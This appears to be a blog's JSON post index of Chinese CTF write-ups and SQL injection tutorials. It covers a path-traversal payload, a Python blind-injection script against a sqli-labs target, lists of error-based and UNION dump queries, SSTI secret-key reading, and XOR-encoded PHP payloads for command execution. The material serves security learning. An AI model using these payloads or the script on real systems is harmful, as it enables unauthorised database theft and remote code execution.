[{"id":"a8af1a6f64d93e24706a1f4356026a5b","title":"HCTF-2018-WarmUp 1","content":"打开题目页面中只有一张图片，\n\nF12查看页面源码\n\n访问source.php\n &lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    &#123;\n        public static function checkFile(&amp;$page)\n        &#123;\n            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];\n            if (! isset($page) || !is_string($page)) &#123;\n                echo &quot;you can&#39;t see it&quot;;\n                return false;\n            &#125;\n\n            if (in_array($page, $whitelist)) &#123;\n                return true;\n            &#125;\n\n            $_page &#x3D; mb_substr(\n                $page,\n                0,\n                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)\n            );\n            if (in_array($_page, $whitelist)) &#123;\n                return true;\n            &#125;\n\n            $_page &#x3D; urldecode($page);\n            $_page &#x3D; mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)\n            );\n            if (in_array($_page, $whitelist)) &#123;\n                return true;\n            &#125;\n            echo &quot;you can&#39;t see it&quot;;\n            return false;\n        &#125;\n    &#125;\n\n    if (! empty($_REQUEST[&#39;file&#39;])\n        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])\n        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])\n    ) &#123;\n        include $_REQUEST[&#39;file&#39;];\n        exit;\n    &#125; else &#123;\n        echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;;\n    &#125;  \n?&gt; \n\n分析代码，第一段定义了一个类，类中定义了一个函数checkFile(&amp;$page)，其中定义了一个$whitelist白名单数组，数组内容是source.php和hint.php，查看hint.php\n\n! isset($page) || !is_string($page)判断输入的$page变量是否已设置且是一个字符串，in_array判断$page的内容是否在白名单中。\nmb_strpos 用于查找字符串在另一个字符串中首次出现的位置， $page . ‘?’ 会在后面自动对我们搜索文件路径添加一个 ?mb_strpos($page . ‘?’, ‘?’) 就是匹配第一次出现问号的位置。和前面的mb_substr函数一配合就会 从一开始截取到第一次问号的位置\nin_array($_page, $whitelist)判断输入的内容是否在白名单数组中，是的话返回true\n截取完之后就又会进行一次判断 if (in_array($_page, $whitelist))\n如果 $_page 在白名单里面就返true，换句话说就是检查我们输入的文件路径是否还包含 source.php或者hint.php\n因为有 mb_substr() mb_strpos() 函数所以不能直接使用问号，于是尝试对?进行两次url编码，结果为%253F\n第二段调用类中定义的函数，通过变量file输入内容\n?file&#x3D;source.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg\n得到flag\n\n","slug":"HCTF-2018-WarmUp-1","date":"2023-02-07T11:17:47.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"688e9a26544b13828bb5688670613069","title":"极客大挑战 2019-EasySQL1","content":"\n进入题目后发现有用户名和密码两个可输入项，明显与数据库有交互，进行SQL注入判断闭合符\n\n\n报错信息为111’由此可知闭合符号为单引号’尝试使用万能密码1’ or ‘a’ &#x3D; ‘a’#\n\n万能密码的原理：SQL语句中#后的语句全部被注释掉，输入1’保证闭合完整不报错，or是或运算符，只要or前后有一项为真即可，上面语句中’a’&#x3D;’a’为恒等式，所以username是否为真就不再重要，因此称为万能密码。\n","slug":"极客大挑战-2019-EasySQL1","date":"2023-02-06T11:37:11.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"b489cff445cdd5efb0eecf16026a5aca","title":"SQL注入其三","content":"盲注脚本编写\n在长度未知的情况下，截取结果的某一位 “str” 与ascii码 [32, 128) 比较，如果所有可见字符都与结果不匹配，则说明结果是空值，也就是已超出最大长度，此时停下脚本即可根据情况选择脚本正确判断的条件，比如某些字符出现时代表页面正常或根据页面返回长度判断\n例：对sqllab靶场第八关sqli-less8的当前数据库名进行爆破的盲注脚本\nimport requests\n\ndef get_info(sql):\n    result,flag &#x3D; &quot;&quot;,True\n    for i in range(1,1000):\n        if(flag):\n            flag &#x3D; False\n            for j in range(32,128):\n                res &#x3D; requests.get(f&quot;http:&#x2F;&#x2F;www.sqli.com&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&#x3D;&#123;j&#125; -- + &quot;)\n                if(&quot;You are in&quot; in res.text):\n                    flag &#x3D; True\n                    result +&#x3D; chr(j)\n                    print(result)\n                    break\n        else:\n            print(f&quot;数据长度为&#123;i-2&#125;位，脚本运行结束&quot;)\n            break\n    return result\n\nget_info(&quot;select database()&quot;)\n\n脚本运行结果：\n\n有时因为网络环境因素，经常会遇到连接超时的情况，则可能需要用到超时重发\nimport requests\n\nsession &#x3D; requests.Session()\na &#x3D; requests.adapters.HTTPAdapter(max_retries &#x3D; 3)\nb &#x3D; requests.adapters.HTTPAdapter(max_retries &#x3D; 3)\nsession.mount(&#39;http:&#x2F;&#x2F;&#39;,a)\nsession.mount(&#39;https:&#x2F;&#x2F;&#39;,b)\n\ndef get_info(sql):\n    result,flag &#x3D; &quot;&quot;,True\n    for i in range(1,1000):\n        if(flag):\n            flag &#x3D; False\n            for j in range(32,128):\n                try:\n                    res &#x3D; session.get(f&quot;http:&#x2F;&#x2F;www.sqli.com&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&#x3D;&#123;j&#125; -- +&quot;)\n                except Exception as e:\n                    exit(&quot;网络请求错误，程序退出&quot;)\n                \n                if(&quot;You are in&quot; in res.text):\n                    flag &#x3D; True\n                    result +&#x3D; chr(j)\n                    print(result)\n                    break\n        else:\n            print(f&quot;数据长度为&#123;i-2&#125;，脚本运行结束&quot;)\n            break\n    return result\n\nget_info(&quot;select version()&quot;)\n\n\n也可已通过使用二分法来提高查找效率\n脚本执行的结果可以通过os.path文件路径来保存到指定文件中\nimport os\n# 当前文件绝对路径\nprint(os.path.abspath(__file__))\n# 当前文件所在目录\nprint(os.path.dirname(os.path.abspath(__file__)))\n\n","slug":"SQL注入其三","date":"2023-02-06T11:19:41.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"c35bf4cdcf9610d9342e4b2e541833f0","title":"SQL注入其二","content":"1. 报错注入\nmysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息，在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语句的执行结果\n报错注入常用函数\n1.floor()\n\nselect * from test where id&#x3D;1 and (select 1 from (select count(*),concat((select\n\nuser()),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n2.extractvalue()\n\nselect * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select\n\nuser()),0x7e)));\n\n3.updatexml()\n\nselect * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select\n\nuser()),0x7e),1));\n\n4.geometrycollection()\n\nselect * from test where id&#x3D;1 and geometrycollection((select * from(select *\n\nfrom(select user())a)b));\n\n5.multipoint()\n\nselect * from test where id&#x3D;1 and multipoint((select * from(select * from(select\n\nuser())a)b));\n\n6.polygon()\n\nselect * from test where id&#x3D;1 and polygon((select * from(select * from(select\n\nuser())a)b));\n\n7.multipolygon()\n\nselect * from test where id&#x3D;1 and multipolygon((select * from(select *\n\nfrom(select user())a)b));\n\n8.linestring()\n\nselect * from test where id&#x3D;1 and linestring((select * from(select * from(select\n\nuser())a)b));\n\n9.multilinestring()\n\nselect * from test where id&#x3D;1 and multilinestring((select * from(select *\n\nfrom(select user())a)b));\n\n10.exp()\n\nselect * from test where id&#x3D;1 and exp(~(select * from(select user())a));\n\n2. 布尔盲注\n布尔盲注一般适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息，单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 1 及 and 0来，判断sql语句有没有成功执行，如果sql语句执行了说明闭合符号找对了\n查询数据内容\n由于没有回显，我们只能利用一些函数来构造等式，判断数据内容\nlength() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度\nand length(database())&#x3D;8 – + # 判断当前数据库名长度\nsubstr() \\ left() 函数 截取查询结果字符进行判断\nand substr(database(),1,1)&#x3D;’a’ – + # 使用指定字符一位一位判断截取到的字符\nand left(database(),8)&#x3D;’security’ – + # 截取指定长度结果，进行判断\n# 可使用ascii函数，查询截取到字符的ascii码\nascii(substr(database(),1,1))&#x3D;115 – + # 使用ascii码一位一位比对截取到的字符\n然后用burp盲注爆破\n3. 延时注入\n延时注入是盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断，sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入\n单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and sleep(5) 来判断sql语句有没有成功执行，如果sql语句执行了说明闭合符号找对了\n由于没有回显，我们只能利用一些函数来构造等式，判断数据内容\nlength() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度\nand if(length(database()) &#x3D; 8, sleep(3),1) – + # 判断当前数据库名长度\n同布尔盲注可用burp进行延时注入的爆破，虽然burp爆破的方式可以实现注入，但结果不利于信息的获取，可利用注入脚本进行操作\n","slug":"SQL注入其二","date":"2023-01-15T07:43:08.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"50f911bc61e762a93882fb5a0615065b","title":"SQL注入其一","content":"1.SQL注入流程\n得到目标网站的一般信息和技术分析信息之后，就要寻找注入点和测试注入点，这些点位都是与数据库有交互的地方（且参数可控）一般在三个地方寻找注入点：(1)表单中的输入参数 (2)URL中的参数 (3) Cookie或header头中其它参数\n2.测试注入点&amp;&amp;判断闭合符号\n常用的测试符号 单引号’ 双引号’’ 无符号（直接拼接） 圆括号() 这些符号通常是服务器后台代码中用来包裹用户输入变量的字符，当插入正确的闭合字符时，会破坏原有的sql语句;\n-- +会将后接的内容视为注释，-- +注释掉了后边的语句，使sql能够正常执行\n3.万能密码原理\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; or 1#&#39; and password &#x3D; &#39;$password&#39; limit 0,1;\n\n去掉被注释的内容，sql语句如下：\n# 由于admin账号存在，所以该语句恒为真，故登陆成功，这在sql注入中被称为万能密码\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; or 1\n\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; and password &#x3D; &#39;123&#39; or 1#&#39; limit 0,1;\n\n4.UNION 联合查询注入\n联合查询是使用 union 或者 union all 拼接两条 select 语句来进行查询注入方式，效率非常高,后一条select语句的查询结果列数要与前一条相同\n二分法查找列数：先 order by 一个比较大的数字m，若报错再取其中位数 n 继续 order by， 若正常说明列数在 [n, m) 之间， 再取 n , m 之间的中位数 order by 如此反复多次，即可获取列数\n5.查询数据库内容常用语句\n1.暴库：select group_concat(schema_name) from information_schema.schemata;\n\n2.暴表1：select group_concat(table_name) from information_schema.tables where\n\ntable_schema&#x3D;&#39;security&#39;; 加引号 table_schema&#x3D;database()表示查询当前网站使用的数据库\n\n暴表2：select table_name from information_schema.tables where\n\ntable_schema&#x3D;&#39;security&#39; limit 3,1; 加引号\n\n3.暴字段1：select group_concat(column_name) from information_schema.columns where\n\ntable_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;; 加引号\n\n暴字段2：select column_name from information_schema.columns where\n\ntable_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39; limit 1,1;\n\n4.暴字段值（暴数据）：select group_concat(username,0x3a,password) from security.users; &#x2F;&#x2F;不加引号\n\n\n\n\n\n","slug":"SQL注入其一","date":"2023-01-14T01:50:00.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"a02765d3f17045091b7948695d0675cc","title":"SSTI的理解","content":"SSTI的理解：\nSSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。\nSSTI引发的真正原因：render_template渲染函数的问题\nrender_template渲染函数是什么：就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。\nrender_template：\n渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即： {{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。因此才有了现在的模板注入漏洞。对于往往变量，我们使用{{这里是内容}}，因为{{}}包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞\n题目页面\n\n测试发现页面传入的参数为search\n\n使用config查看全局变量\n查看secret_key\nsearch&#x3D;{{config.SECRET_KEY}}\n\n","slug":"SSTI的理解","date":"2023-01-14T01:31:42.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"be2622c109e5481786c1d7440a312fa3","title":"无字母数字RCE","content":"题目：\n&lt;?php\nerror_reporting(0);\nif(isset($_GET[&#39;code&#39;]))&#123;\n        $code&#x3D;$_GET[&#39;code&#39;];         \n        if(preg_match(&quot;&#x2F;[a-z0-9]&#x2F;is&quot;,$code))&#123;\n            die(&quot;NO.&quot;);\n        &#125;\n        @eval($code);\n&#125;\nelse&#123;\n        highlight_file(__FILE__);\n&#125;\n?&gt;\n\n\n无字母数字进行RCE\neval函数中的内容会被视为php代码进行执行，只要令code的内容为需要进行的操作可以利用除字母数字以外的字符（ASCII码1~256中的字符）进行运算操作而凑出想要的字符，可以让code的值为\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n即：$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n\n采用url编码异或的方式得到%0c%08”^”%60%7b &#x2F;&#x2F;ls\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%22%0c%08&quot;^&quot;%60%7b%22);&amp;%ff&#x3D;system\n\n即\n$&#123;_GET&#125;&#123;%ff&#125;(&quot;ls&quot;);&amp;%ff&#x3D;system\n\n执行结果\n\n查看上一层中的文件\n\n%0c%08%01%00&quot;^&quot;%60%7b%21%2f &#x2F;&#x2F;ls &#x2F;\n\n%03%01%09%01%00%06%06%06%06%0c%0c%0c%0c%01%01%01%01%07%07%07%07&quot;^&quot;%60%60%7d%21%2f%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60 &#x2F;&#x2F; cat &#x2F;ffffllllaaaagggg\n\n\n\n","slug":"无字母数字RCE","date":"2023-01-14T01:04:37.000Z","categories_index":"","tags_index":"","author_index":"Aurora"}]